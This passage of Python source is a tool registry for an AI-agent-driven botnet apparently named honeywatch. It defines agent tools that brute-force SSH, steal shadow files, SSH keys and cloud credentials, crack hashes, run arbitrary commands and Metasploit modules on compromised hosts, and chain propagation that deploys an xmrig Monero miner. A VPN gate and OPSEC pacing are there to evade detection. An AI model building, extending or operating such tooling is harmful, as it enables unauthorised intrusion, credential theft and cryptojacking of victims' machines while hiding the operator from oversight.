    results = asyncio.run(crack_targets(targets, concurrency=concurrency, host_concurrency=host_concurrency))

    for res in results:
        if res.success:
            ctx.store.upsert_credential(
                res.ip, res.port, res.user or "", res.password,
                banner=res.banner, attempts=res.attempts, source="crack",
            )

    wins = [r.credential() for r in results if r.success]
    return {
        "hosts": len(results),
        "successes": len(wins),
        "attempts": sum(r.attempts for r in results),
        "credentials": wins,
        "results": [r.credential() for r in results],
    }


def _tool_list_credentials(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    rows = ctx.store.query_credentials(
        ip=args.get("ip"), user=args.get("user"),
        limit=int(args.get("limit", 100)),
    )
    return {"count": len(rows), "credentials": rows}


def _tool_grab_shadow(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
    if not skip and not _require_vpn(ctx):
        return {"error": "VPN gate blocked the grab. Connect Mullvad or pass skip_vpn_check=true."}

    from honeywatch.cli import parse_host
    from honeywatch.hashcrack import grab_shadow

    ip, port = parse_host(args["host"])
    user = args.get("user")
    passw = args.get("pass")
    if (not user or not passw) and not args.get("key"):
        cred = ctx.store.credential_for(ip, port)
        if cred:
            user = user or cred.get("user")
            passw = passw or cred.get("password")
    res = grab_shadow(
        ip=ip, port=port, user=user, password=passw, key_path=args.get("key"),
        stash_dir=args.get("stash", ".honeywatch/shadow_stash"),
        timeout_s=10.0,
    )
    return res


def _tool_grab_loot(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
    if not skip and not _require_vpn(ctx):
        return {"error": "VPN gate blocked the loot. Connect Mullvad or pass skip_vpn_check=true."}

    from honeywatch.cli import parse_host
    from honeywatch.loot import grab_loot

    ip, port = parse_host(args["host"])
    user = args.get("user")
    passw = args.get("pass")
    # Auto-fill from the credentials store when the operator did not pin creds.
    if (not user or not passw) and not args.get("key"):
        cred = ctx.store.credential_for(ip, port)
        if cred:
            user = user or cred.get("user")
            passw = passw or cred.get("password")
    # Encrypt loot at rest if requested and vault passphrase is available.
    vault_key = None
    if args.get("encrypt") and ctx.config.get("storage", {}).get("vault_passphrase"):
        from honeywatch.c2.crypto import derive_vault_key
        vault_key = derive_vault_key(ctx.config["storage"]["vault_passphrase"])
    res = grab_loot(
        ip=ip, port=port, user=user, password=passw, key_path=args.get("key"),
        stash_dir=args.get("stash", ".honeywatch/loot_stash"),
        timeout_s=10.0,
        vault_key=vault_key,
    )
    return {
        "ip": res.ip, "port": res.port,
        "files": len(res.files),
        "ssh_keys": len(res.ssh_keys),
        "cloud_creds": len(res.cloud_creds),
        "pivot_targets": len(res.pivot_targets),
        "metadata": res.metadata,
        "competing_miners": res.competing_miners,
        "installed_packages": len(res.installed_packages),
        "vulnerable_packages": res.vulnerable_packages,
        "summary": res.summary(),
        "error": res.error,
    }


def _tool_hashcrack(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    import os
    from honeywatch.crack import default_wordlist_path
    from honeywatch.hashcrack import crack_shadow

    shadow_path = args["shadow"]
    if os.path.isdir(shadow_path):
        sub = os.path.join(shadow_path, "shadow")
        if os.path.isfile(sub):
            shadow_path = sub
    if not os.path.isfile(shadow_path):
        return {"error": "shadow file not found: " + args["shadow"]}

    wordlist = args.get("wordlist") or default_wordlist_path()
    tool = args.get("tool", "hashcat")
    mode = args.get("mode")
    if mode is not None:
        mode = int(mode)
    result = crack_shadow(
        shadow_path=shadow_path,
        wordlist=wordlist,
        tool=tool,
        mode=mode,
        timeout_s=args.get("timeout"),
    )
    creds = result.credentials()
    if creds and not bool(args.get("no_save", False)):
        ip = args.get("ip") or ""
        port = int(args.get("port", 22))
        for c in creds:
            if ip:
                ctx.store.upsert_credential(
                    ip, port, c["user"], c["password"],
                    banner=None, attempts=1,
                    source="hashcat" if tool == "hashcat" else "john",
                )
    return {
        "tool": result.tool,
        "attempted": result.attempted,
        "cracked": len(creds),
        "error": result.error,
        "returncode": result.returncode,
        "credentials": creds,
    }


def _tool_run_chain(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
    if not skip and not _require_vpn(ctx):
        return {"error": "VPN gate blocked the chain. Connect Mullvad or pass skip_vpn_check=true."}

    from honeywatch.chain import ChainConfig, run_chain

    targets = [t.strip() for t in (args.get("targets") or "").split(",") if t.strip()]
    payload_id = args.get("payload", "xmrig")
    # The Monero wallet + pool are configured once during `honeywatch setup` and
    # live in the agent setup store (ctx.agent_config). Default from there so the
    # model can call run_chain without re-passing pool/wallet, and a
    # setup-configured wallet actually reaches the chain's deploy phase. Explicit
    # per-call args still win (same contract as the `deploy` tool). Without this,
    # `honeywatch setup` was pointless for the chain -- botnet/run_chain demanded
    # --pool/--wallet every single time even after you configured them once.
    pool = args.get("pool") or ctx.agent_config.pool
    wallet = args.get("wallet") or ctx.agent_config.wallet
    worker = ctx.agent_config.worker
    tls = ctx.agent_config.tls

    if payload_id in {"xmrig", "xmrigcc"}:
        missing = [k for k, v in (("pool", pool), ("wallet", wallet)) if not v]
        if missing:
            return {
                "error": (
                    f"miner deploy needs {' and '.join(missing)}; configure via "
                    "set_wallet (or `honeywatch setup`) or pass them to run_chain."
                )
            }

    cfg = ChainConfig(
        targets=targets,
        users=[u.strip() for u in (args.get("users") or "").split(",") if u.strip()],
        passwords=[p.strip() for p in (args.get("passwords") or "").split(",") if p.strip()],
        payload_id=payload_id,
        pool=pool,
        wallet=wallet,
        worker=worker,
        tls=tls,
        hashcrack_wordlist=args.get("hashcrack_wordlist") or "",
        business_hours=bool(args.get("business_hours", False)),
        max_rounds=int(args.get("max_rounds", 3)),
        skip_vpn_check=skip,
        db_path=ctx.db_path,
    )
    state = run_chain(cfg)
    return {
        "rounds": state.round,
        "hosts": len(state.hosts),
        "credentials": len(state.credentials),
        "footholds": len(state.footholds),
        "enqueued": len(state.enqueued),
        "stopped": state.stopped,
        "stop_reason": state.stop_reason,
    }


def _summarize_scores(scores: list[Score]) -> dict[str, int]:
    from collections import Counter

    return dict(Counter(s.final_label for s in scores))


def _score_summary(s: Score) -> dict[str, Any]:
    return {
        "ip": s.ip,
        "port": s.port,
        "label": s.final_label,
        "confidence": s.final_confidence,
        "banner": s.fingerprint.banner if s.fingerprint else None,
        "software": s.fingerprint.software if s.fingerprint else None,
        "version": s.fingerprint.software_version if s.fingerprint else None,
        "flags": s.signals.flags if s.signals else [],
    }


def _set(obj, name: str, value: Any) -> None:
    try:
        setattr(obj, name, value)
    except Exception:
        pass


# --------------------------------------------------------------------------- #
# Hypothesis + audit tools (Phase 1+2)
# --------------------------------------------------------------------------- #


def _tool_propose_hypothesis(args, ctx):
    """Declare a hypothesis for the outcome judge to track."""
    statement = args.get("statement", "").strip()
    if not statement:
        return {"error": "statement is required"}
    # run_id / cycle are set by the agent loop when it wires the context; fall
    # back to a session-derived id when not set (e.g. interactive chat).
    run_id = getattr(ctx, "run_id", "") or "interactive"
    cycle = getattr(ctx, "cycle", 0) or 0
    hyp = ctx.hypothesis_store.propose(
        run_id=run_id,
        cycle=cycle,
        statement=statement,
        target=args.get("target", ""),
        expected_evidence=args.get("expected_evidence", ""),
    )
    return {
        "hypothesis_id": hyp.id,
        "status": hyp.status.value if hasattr(hyp.status, "value") else str(hyp.status),
        "statement": hyp.statement,
    }


def _tool_list_hypotheses(args, ctx):
    """Query the hypothesis ledger."""
    status = args.get("status", "").strip() or None
    limit = int(args.get("limit", 50))
    run_id = getattr(ctx, "run_id", "") or "interactive"
    hyps = ctx.hypothesis_store.all_hypotheses(run_id=run_id, status=status, limit=limit)
    return {
        "count": len(hyps),
        "hypotheses": [
            {
                "id": h.id,
                "status": h.status.value if hasattr(h.status, "value") else str(h.status),
                "statement": h.statement,
                "target": h.target,
                "confidence": h.confidence,
                "tool": h.tool,
                "attempts": h.attempt_count,
            }
            for h in hyps
        ],
    }


def _tool_score_outcome(args, ctx):
    """Provide evidence for the outcome judge to evaluate against a hypothesis."""
    hyp_id = args.get("hypothesis_id", "").strip()
    if not hyp_id:
        return {"error": "hypothesis_id is required"}
    evidence_str = args.get("evidence", "")
    try:
        evidence = json.loads(evidence_str) if isinstance(evidence_str, str) else evidence_str
    except (json.JSONDecodeError, TypeError):
        evidence = {"raw": evidence_str}

    hyp = ctx.hypothesis_store.get(hyp_id)
    if hyp is None:
        return {"error": f"hypothesis {hyp_id!r} not found"}

    from honeywatch.agent.hypothesis import judge_outcome
    judgment = judge_outcome(hyp, evidence if isinstance(evidence, dict) else {})
    tool_name = args.get("tool", "").strip() or None
    updated = ctx.hypothesis_store.judge(
        hyp_id, judgment,
        evidence=evidence if isinstance(evidence, dict) else {},
        tool_name=tool_name,
    )
    if updated is None:
        return {"error": "could not update hypothesis (already terminal or not found)"}
    return {
        "hypothesis_id": updated.id,
        "operational_success": judgment.operational_success,
        "evidential_status": updated.status.value if hasattr(updated.status, "value") else str(updated.status),
        "confidence": updated.confidence,
        "evidence_summary": judgment.evidence_summary,
        "attempts": updated.attempt_count,
    }


def _tool_verify_audit(args, ctx):
    """Verify the tamper-evident audit chain."""
    run_id = args.get("run_id", "").strip() or None
    valid, reason = ctx.audit_store.verify_chain(run_id=run_id)
    return {"chain_valid": valid, "reason": reason}


def _tool_get_evidence(args, ctx):
    """Read recent audit-chain records for a target."""
    target = args.get("target", "").strip()
    if not target:
        return {"error": "target is required"}
    limit = int(args.get("limit", 25))
    records = ctx.audit_store.recent(target_ip=target, limit=limit)
    # Trim the records for the model — full result_json can be large.
    trimmed = []
    for rec in records:
        trimmed.append({
            "seq": rec.get("seq"),
            "cycle": rec.get("cycle"),
            "tool": rec.get("tool"),
            "action": rec.get("action"),
            "timestamp": rec.get("timestamp"),
            "this_hash": (rec.get("this_hash") or "")[:12] + "...",
            "prev_hash": (rec.get("prev_hash") or "")[:12] + "...",
        })
    return {"count": len(trimmed), "records": trimmed}


# --------------------------------------------------------------------------- #
# Capability graph tools (Phase 3)
# --------------------------------------------------------------------------- #


def _tool_query_capabilities(args, ctx):
    """List available capability graph nodes + their ready/blocked/done status."""
    from honeywatch.capability import build_default_graph, ChainContext
    graph = build_default_graph()
    # Build a lightweight context from the store state.
    state = _build_chain_context_state(ctx)
    cap_ctx = ChainContext(
        state=state, config=_build_chain_config_stub(ctx),
        hypothesis_store=ctx.hypothesis_store,
        run_id=getattr(ctx, "run_id", ""),
    )
    phase_filter = args.get("phase", "").strip() or None
    ready = graph.next_capabilities(cap_ctx)
    blocked = graph.blocked_capabilities(cap_ctx)
    caps_info = []
    for cap in graph.capabilities:
        if phase_filter and cap.phase_hint.value != phase_filter:
            continue
        is_ready = cap in ready
        is_blocked = any(cap.id == b[0].id for b in blocked)
        missing = []
        for b_cap, b_missing in blocked:
            if b_cap.id == cap.id:
                missing = b_missing
        caps_info.append({
            "id": cap.id,
            "name": cap.name,
            "phase": cap.phase_hint.value,
            "requires": cap.requires,
            "produces": cap.produces,
            "status": "ready" if is_ready else ("blocked" if is_blocked else "done"),
            "missing": missing,
            "cost": cap.cost,
        })
    return {"count": len(caps_info), "capabilities": caps_info}


def _tool_get_capability_details(args, ctx):
    """Get full details on one capability node."""
    name = args.get("name", "").strip()
    if not name:
        return {"error": "name is required"}
    from honeywatch.capability import build_default_graph, ChainContext
    graph = build_default_graph()
    cap = graph.get(name)
    if cap is None:
        return {"error": f"unknown capability: {name!r}"}
    state = _build_chain_context_state(ctx)
    cap_ctx = ChainContext(
        state=state, config=_build_chain_config_stub(ctx),
        hypothesis_store=ctx.hypothesis_store,
        run_id=getattr(ctx, "run_id", ""),
    )
    applicability = cap.applicability(cap_ctx)
    missing = graph.missing_prerequisites(cap, cap_ctx)
    producers = graph.find_producers(missing[0]) if missing else []
    return {
        "id": cap.id,
        "name": cap.name,
        "phase": cap.phase_hint.value,
        "requires": cap.requires,
        "produces": cap.produces,
        "cost": cap.cost,
        "tool_name": cap.tool_name,
        "applicability": applicability,
        "status": "ready" if applicability > 0 else ("blocked" if missing else "done"),
        "missing_prerequisites": missing,
        "producers_for_missing": [
            {"id": p.id, "name": p.name} for p in producers
        ] if missing else [],
    }


def _build_chain_context_state(ctx):
    """Build a lightweight state object from the store for capability graph queries."""
    from honeywatch.chain import ChainState
    state = ChainState()
    try:
        rows = ctx.store.query(limit=100000)
        state.hosts = [(r["ip"], int(r["port"])) for r in rows]
    except Exception:
        pass
    try:
        creds = ctx.store.query_credentials(limit=100000)
        state.credentials = list(creds)
    except Exception:
        pass
    try:
        from honeywatch.c2.store import C2Store
        c2 = C2Store(ctx.db_path)
        tasks = c2.list_tasks()
        state.enqueued = [(t.get("target", {}).get("ip", ""), int(t.get("target", {}).get("port", 22)))
                          for t in tasks if t.get("status") != "completed"]
    except Exception:
        pass
    return state


def _build_chain_config_stub(ctx):
    """Build a minimal config stub for ChainContext.has_artifact()."""
    from honeywatch.chain import ChainConfig
    cfg = ChainConfig(targets=[])
    cfg.shadow_stash = ".honeywatch/shadow_stash"
    return cfg


# --------------------------------------------------------------------------- #
# Phase 8+: New agent tools (exec_command, port_scan, web_probe,
#           credential_for, test_credential, botnet_status, metasploit)
# --------------------------------------------------------------------------- #


def _tool_exec_command(args, ctx):
    """Run an arbitrary command on a foothold via SSH."""
    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
    if not skip and not _require_vpn(ctx):
        return {"error": "VPN gate blocked. Connect Mullvad or pass skip_vpn_check=true."}
    host = args.get("host", "").strip()
    if not host:
        return {"error": "host is required"}
    port = int(args.get("port", 22))
    command = args.get("command", "").strip()
    if not command:
        return {"error": "command is required"}
    timeout = float(args.get("timeout", 15))
    # Resolve credential: provided args > stored cred.
    user = args.get("user", "").strip()
    password = args.get("password", "").strip()
    if not user or not password:
        cred = ctx.store.credential_for(host, port)
        if cred:
            user = user or cred.get("user", "")
            password = password or cred.get("password", "")
    if not user:
        return {"error": f"no credential for {host}:{port} and no user provided"}
    # Use the chain's _ssh_exec for consistency.
    from honeywatch.chain import _ssh_exec
    key_path = None
    if password and password.startswith("key:"):
        key_path = password[4:]
        password = None
    rc, out, err = _ssh_exec(host, port, user, password, key_path, command, timeout)
    return {
        "host": host, "port": port, "user": user,
        "command": command[:200], "returncode": rc,
        "stdout": (out or "")[:4000], "stderr": (err or "")[:1000] if err else None,
    }


def _tool_port_scan(args, ctx):
    """Quick stdlib TCP connect port scanner."""
    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
    if not skip and not _require_vpn(ctx):
        return {"error": "VPN gate blocked. Connect Mullvad or pass skip_vpn_check=true."}
    targets_str = args.get("targets", "").strip()
    if not targets_str:
        return {"error": "targets is required"}
    from honeywatch.cli import parse_ports
    ports = parse_ports(args.get("ports", "22,80,443,8080"))
    timeout = float(args.get("timeout", 2))
    concurrency = int(args.get("concurrency", 256))
    # Expand targets (IPs + CIDRs).
    import ipaddress
    ips: list[str] = []
    for spec in targets_str.split(","):
        spec = spec.strip()
        if not spec:
            continue
        try:
            if "/" in spec:
                net = ipaddress.ip_network(spec, strict=False)
                ips.extend(str(ip) for ip in net.hosts()[:4096])
            else:
                ips.append(spec)
        except ValueError:
            ips.append(spec)
    # Async TCP connect scan.
    import asyncio
    async def _scan():
        sem = asyncio.Semaphore(concurrency)
        results: dict[str, list[int]] = {}
        async def _probe(ip: str, port: int):
            async with sem:
                try:
                    _, writer = await asyncio.wait_for(
                        asyncio.open_connection(ip, port), timeout=timeout)
                    writer.close()
                    try:
                        await writer.wait_closed()
                    except Exception:
                        pass
                    results.setdefault(ip, []).append(port)
                except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
                    pass
        tasks = [_probe(ip, p) for ip in ips for p in ports]
        await asyncio.gather(*tasks)
        return results
    try:
        results = asyncio.run(_scan())
    except RuntimeError:
        # Already in an event loop — run in a thread.
        import concurrent.futures
        with concurrent.futures.ThreadPoolExecutor() as pool:
            results = pool.submit(asyncio.run, _scan()).result()
    open_hosts = {ip: sorted(ps) for ip, ps in results.items() if ps}
    return {
        "targets": targets_str, "ports_scanned": len(ports),
        "hosts_up": len(open_hosts),
        "open_ports": {ip: ps for ip, ps in open_hosts.items()},
    }


def _tool_web_probe(args, ctx):
    """HTTP probe via stdlib urllib."""
    url = args.get("url", "").strip()
    if not url:
        return {"error": "url is required"}
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    timeout = float(args.get("timeout", 5))
    paths_str = args.get("paths", "")
    if paths_str:
        paths = [p.strip() if p.strip().startswith("/") else "/" + p.strip()
                 for p in paths_str.split(",") if p.strip()]
    else:
        paths = ["/admin", "/.env", "/wp-login.php", "/robots.txt", "/.git/HEAD"]
    import urllib.request
    import urllib.error
    findings: list[dict] = []
    # Probe the base URL first.
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            findings.append({
                "path": "/", "status": resp.status,
                "headers": dict(resp.headers),
            })
    except urllib.error.HTTPError as exc:
        findings.append({"path": "/", "status": exc.code, "headers": dict(exc.headers)})
    except Exception as exc:
        findings.append({"path": "/", "error": f"{type(exc).__name__}: {exc}"})
    # Probe paths.
    for path in paths:
        full_url = url.rstrip("/") + path
        try:
            req = urllib.request.Request(full_url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read(2048)
                findings.append({
                    "path": path, "status": resp.status,
                    "content_type": resp.headers.get("Content-Type", ""),
                    "body_preview": body.decode("utf-8", "replace")[:200],
                })
        except urllib.error.HTTPError as exc:
            findings.append({"path": path, "status": exc.code})
        except Exception:
            pass  # connection refused, timeout, etc. — skip
    return {"url": url, "findings": findings, "paths_checked": len(paths) + 1}


def _tool_credential_for(args, ctx):
    """Query stored credentials for a specific host."""
    host = args.get("host", "").strip()
    if not host:
        return {"error": "host is required"}
    port = args.get("port")
    creds = ctx.store.query_credentials(limit=100000)
    filtered = [c for c in creds if c.get("ip") == host]
    if port:
        filtered = [c for c in filtered if int(c.get("port", 22)) == int(port)]
    return {
        "host": host, "port": port,
        "count": len(filtered),
        "credentials": [
            {"user": c.get("user", ""), "password": c.get("password", ""),
             "source": c.get("source", ""), "port": c.get("port", 22)}
            for c in filtered
        ],
    }


def _tool_test_credential(args, ctx):
    """Verify a credential works by attempting a quick SSH auth check."""
    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
    if not skip and not _require_vpn(ctx):
        return {"error": "VPN gate blocked. Connect Mullvad or pass skip_vpn_check=true."}
    host = args.get("host", "").strip()
    if not host:
        return {"error": "host is required"}
    port = int(args.get("port", 22))
    user = args.get("user", "").strip()
    password = args.get("password", "").strip()
    if not user or not password:
        cred = ctx.store.credential_for(host, port)
        if cred:
            user = user or cred.get("user", "")
            password = password or cred.get("password", "")
    if not user:
        return {"error": f"no credential for {host}:{port} and no user provided"}
    from honeywatch.chain import _ssh_exec
    key_path = None
    if password and password.startswith("key:"):
        key_path = password[4:]
        password = None
    rc, out, err = _ssh_exec(host, port, user, password, key_path, "id", 10)
    success = rc == 0 and "uid=" in (out or "")
    return {
        "host": host, "port": port, "user": user,
        "valid": success, "returncode": rc,
        "output": (out or "")[:200],
    }


def _tool_botnet_status(args, ctx):
    """Query the current chain state from the store."""
    state = _build_chain_context_state(ctx)
    return {
        "hosts_discovered": len(state.hosts),
        "sprayable_hosts": len(state.sprayable),
        "credentials_recovered": len(state.credentials),
        "footholds": len(state.footholds),
        "enqueued_deploys": len(state.enqueued),
        "pivoted_subnets": len(state.pivoted_subnets),
        "loot_items": len(state.loot),
        "cloud_creds": len(state.cloud_creds),
        "recovered_ssh_keys": len(state.recovered_ssh_keys),
        "foothold_details": [
            {"ip": f[0], "port": f[1], "user": f[2]}
            for f in state.footholds[:20]
        ],
        "host_list": [f"{ip}:{port}" for ip, port in state.hosts[:50]],
    }


def _tool_metasploit(args, ctx):
    """Run a Metasploit module against a target via msfconsole."""
    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
    if not skip and not _require_vpn(ctx):
        return {"error": "VPN gate blocked. Connect Mullvad or pass skip_vpn_check=true."}
    host = args.get("host", "").strip()
    if not host:
        return {"error": "host is required"}
    port = int(args.get("port", 22))
    user = args.get("user", "").strip()
    password = args.get("password", "").strip()
    if not user or not password:
        cred = ctx.store.credential_for(host, port)
        if cred:
            user = user or cred.get("user", "")
            password = password or cred.get("password", "")
    if not user:
        return {"error": f"no credential for {host}:{port} and no user provided"}
    module = args.get("module", "auxiliary/scanner/ssh/ssh_version").strip()
    timeout = int(args.get("timeout", 60))
    # Parse additional options.
    options: dict[str, str] = {}
    opts_str = args.get("options", "")
    if opts_str:
        try:
            options = json.loads(opts_str) if isinstance(opts_str, str) else opts_str
        except (json.JSONDecodeError, TypeError):
            options = {}
    # Check msfconsole is available.
    import shutil
    if not shutil.which("msfconsole"):
        return {"error": "msfconsole not found on PATH. Install Metasploit Framework."}
    # Build a resource script.
    rc_lines = [
        f"use {module}",
        f"set RHOSTS {host}",
        f"set RHOST {host}",
        f"set RPORT {port}",
        f"set USERNAME {user}",
        f"set PASSWORD {password}",
    ]
    for key, value in options.items():
        rc_lines.append(f"set {key} {value}")
    rc_lines.append("run")
    rc_lines.append("exit")
    rc_script = "\n".join(rc_lines)
    # Write the resource script to a temp file and run msfconsole.
    import subprocess
    import tempfile
    import os
    try:
        with tempfile.NamedTemporaryFile(mode="w", suffix=".rc", delete=False, prefix="honeywatch_msf_") as f:
            f.write(rc_script)
            rc_path = f.name
        proc = subprocess.run(
            ["msfconsole", "-q", "-r", rc_path],
            capture_output=True, text=True, timeout=timeout,
        )
        return {
            "host": host, "port": port, "module": module,
            "returncode": proc.returncode,
            "stdout": (proc.stdout or "")[:4000],
            "stderr": (proc.stderr or "")[:1000] if proc.stderr else None,
        }
    except subprocess.TimeoutExpired:
        return {"error": f"msfconsole timed out after {timeout}s"}
    except Exception as exc:
        return {"error": f"msfconsole failed: {type(exc).__name__}: {exc}"}
    finally:
        try:
            os.unlink(rc_path)
        except Exception:
            pass


def _tool_verify_deploy(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
    if not skip and not _require_vpn(ctx):
        return {"error": "VPN gate blocked verification. Connect Mullvad or pass skip_vpn_check=true."}

    from honeywatch.cli import parse_host
    from honeywatch.chain import _ssh_exec

    ip, port = parse_host(args["host"])
    user = args.get("user")
    passw = args.get("pass")
    if (not user or not passw) and not args.get("key"):
        cred = ctx.store.credential_for(ip, port)
        if cred:
            user = user or cred.get("user")
            passw = passw or cred.get("password")
    key_path = args.get("key")
    rc, out, err = _ssh_exec(ip, port, user, passw, key_path,
                              "pgrep -x xmrig >/dev/null 2>&1 && echo RUNNING || echo NOT_RUNNING",
                              10.0)
    status = "running" if "RUNNING" in (out or "") else "not_running"
    return {"ip": ip, "port": port, "miner_status": status, "returncode": rc, "output": (out or "")[:500]}


def _tool_retry_task(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    task_id = args.get("task_id", "")
    if not task_id:
        return {"error": "task_id is required"}
    from honeywatch.c2 import C2Store
    store = C2Store(ctx.config.get("c2", {}).get("db", "honeywatch.db"))
    task = store.query_tasks(task_id=task_id)
    if not task:
        return {"error": f"task {task_id} not found"}
    task = task[0]
    if task.status != "failed":
        return {"error": f"task {task_id} is not failed (status={task.status})"}
    retried = store.fail_task_with_retry(task_id, task.worker_id or "", {"retried_by": "agent"})
    if retried:
        return {"task_id": task_id, "status": "re_queued", "retry_count": task.retry_count + 1}
    else:
        return {"task_id": task_id, "status": "permanently_failed", "retry_count": task.retry_count}


def _tool_ca_rotate(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    action = args.get("action", "check")
    c2_cfg = ctx.config.get("c2", {})
    ca_path = c2_cfg.get("ca_path") or c2_cfg.get("ca")
    if not ca_path:
        return {"error": "No CA path configured. Set c2.ca_path or pass --ca."}
    if action == "check":
        import os
        new_ca = os.path.join(os.path.dirname(os.path.abspath(ca_path)), "honeywatch-ca-new.pem")
        cross = os.path.join(os.path.dirname(os.path.abspath(ca_path)), "ca-cross.pem")
        rotation_active = os.path.isfile(new_ca) and os.path.isfile(cross)
        return {"rotation_active": rotation_active, "ca_path": ca_path, "new_ca_exists": os.path.isfile(new_ca)}
    elif action == "trigger":
        import os
        from honeywatch.c2.ca import rotate_ca
        old_ca_key = os.path.join(os.path.dirname(os.path.abspath(ca_path)), "honeywatch-ca.key")
        new_ca_cert = os.path.join(os.path.dirname(os.path.abspath(ca_path)), "honeywatch-ca-new.pem")
        new_ca_key = os.path.join(os.path.dirname(os.path.abspath(ca_path)), "honeywatch-ca-new.key")
        if not os.path.isfile(old_ca_key):
            return {"error": f"CA key not found at {old_ca_key}"}
        transition_hours = args.get("transition_hours", 24)
        try:
            result = rotate_ca(ca_path, old_ca_key, new_ca_cert, new_ca_key)
        except Exception as exc:
            return {"error": f"CA rotation failed: {exc}"}
        return {
            "new_ca_cert": result["new_ca_cert"],
            "cross_cert": result["cross_cert"],
            "new_pin": result["new_pin"],
            "old_pin": result["old_pin"],
            "transition_hours": transition_hours,
        }
    else:
        return {"error": f"unknown action {action!r}; use 'check' or 'trigger'"}


# Register tools.
_tool("list_payloads", _tool_list_payloads)
_tool("get_status", _tool_get_status)
_tool("scan", _tool_scan)
_tool("probe_host", _tool_probe_host)
_tool("deploy", _tool_deploy)
_tool("report", _tool_report)
_tool("get_operations", _tool_get_operations)
_tool("get_tasks", _tool_get_tasks)
_tool("set_wallet", _tool_set_wallet)
_tool("set_ollama", _tool_set_ollama)
_tool("crack_ssh", _tool_crack_ssh)
_tool("list_credentials", _tool_list_credentials)
_tool("grab_shadow", _tool_grab_shadow)
_tool("grab_loot", _tool_grab_loot)
_tool("hashcrack", _tool_hashcrack)
_tool("run_chain", _tool_run_chain)
_tool("propose_hypothesis", _tool_propose_hypothesis)
_tool("list_hypotheses", _tool_list_hypotheses)
_tool("score_outcome", _tool_score_outcome)
_tool("verify_audit", _tool_verify_audit)
_tool("get_evidence", _tool_get_evidence)
_tool("query_capabilities", _tool_query_capabilities)
_tool("get_capability_details", _tool_get_capability_details)
_tool("exec_command", _tool_exec_command)
_tool("port_scan", _tool_port_scan)
_tool("web_probe", _tool_web_probe)
_tool("credential_for", _tool_credential_for)
_tool("test_credential", _tool_test_credential)
_tool("botnet_status", _tool_botnet_status)
_tool("metasploit", _tool_metasploit)
_tool("verify_deploy", _tool_verify_deploy)
_tool("retry_task", _tool_retry_task)
_tool("ca_rotate", _tool_ca_rotate)


def execute_tool(name: str, args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
    """Execute a tool by name and return its result.

    Every call is recorded to the tamper-evident audit chain (Phase 2) so the
    operator can prove what actually ran on each target.  The record captures
    the tool name, redacted arguments, redacted result, and the SHA256 chain
    link.  Recording is best-effort: an audit failure never breaks the tool.

    Phase 7: OPSEC pacing + noise scoring are applied here so every tool call
    is rate-limited and scored regardless of whether the model asked for it.
    The pacing uses the OpsecManager's sync pacing_delay (time.sleep) since
    execute_tool is a sync function; the async acquire_pacing is available for
    the chain's async phases.
    """
    if name not in TOOL_REGISTRY:
        return {"error": f"unknown tool: {name!r}"}
    # Validate required args up front so an omitted required argument produces a
    # clear, actionable error instead of a cryptic downstream traceback string.
    spec = TOOL_REGISTRY[name]["spec"]
    required = spec.get("parameters", {}).get("required", []) or []
    if required:
        args = args or {}
        missing = [r for r in required if r not in args or args.get(r) is None]
        if missing:
            return {
                "error": (
                    f"tool {name!r} missing required argument(s): "
                    f"{', '.join(missing)}"
                )
            }

    # Phase 7: OPSEC pacing — sleep before the tool runs so rate limiting +
    # min-gap delays actually fire at runtime.  Best-effort: a pacing failure
    # never blocks the tool.
    noise_score = 0
    try:
        mgr = ctx.opsec_manager
        if mgr is not None:
            # Resolve the profile for the target (auto-disable for local IPs).
            target_ip = (args or {}).get("host") or (args or {}).get("target") or (args or {}).get("ip") or ""
            if target_ip and isinstance(target_ip, str):
                mgr = mgr.resolve_for_target(target_ip)
            # Sync pacing delay (time.sleep).
            delay = mgr.pacing_delay("normal")
            if delay > 0:
                import time as _time
                _time.sleep(delay)
            # Score the tool's noise level for the audit record.
            noise_info = mgr.score_command_noise(name)
            noise_score = noise_info.get("score", 0)
    except Exception:
        pass

    try:
        result = TOOL_REGISTRY[name]["func"](args, ctx)
    except Exception as exc:
        result = {"error": f"tool {name!r} failed: {exc!r}"}

    # Record to the audit chain.  Best-effort: never let an audit failure
    # surface as a tool failure to the model.
    try:
        safe_args = args or {}
        target_ip = (
            safe_args.get("host") or safe_args.get("target") or safe_args.get("ip")
            or safe_args.get("targets") or ""
        )
        if isinstance(target_ip, list):
            target_ip = ",".join(str(t) for t in target_ip[:5])
        ctx.audit_store.record(
            run_id=getattr(ctx, "run_id", "interactive"),
            session_id=getattr(ctx, "session_id", ""),
            cycle=getattr(ctx, "cycle", 0),
            target_ip=str(target_ip)[:256],
            tool=name,
            action="execute",
            arguments=safe_args,
            result=result,
            exit_code=0 if not (isinstance(result, dict) and result.get("error")) else 1,
        )
    except Exception:
        pass

    # Phase 7: attach the noise score to the result so the operator can see
    # which tools were noisy (visible in the audit trail + the model's tool
    # results message).
    if noise_score > 0 and isinstance(result, dict) and "error" not in result:
        result["_opsec_noise"] = noise_score

    return result
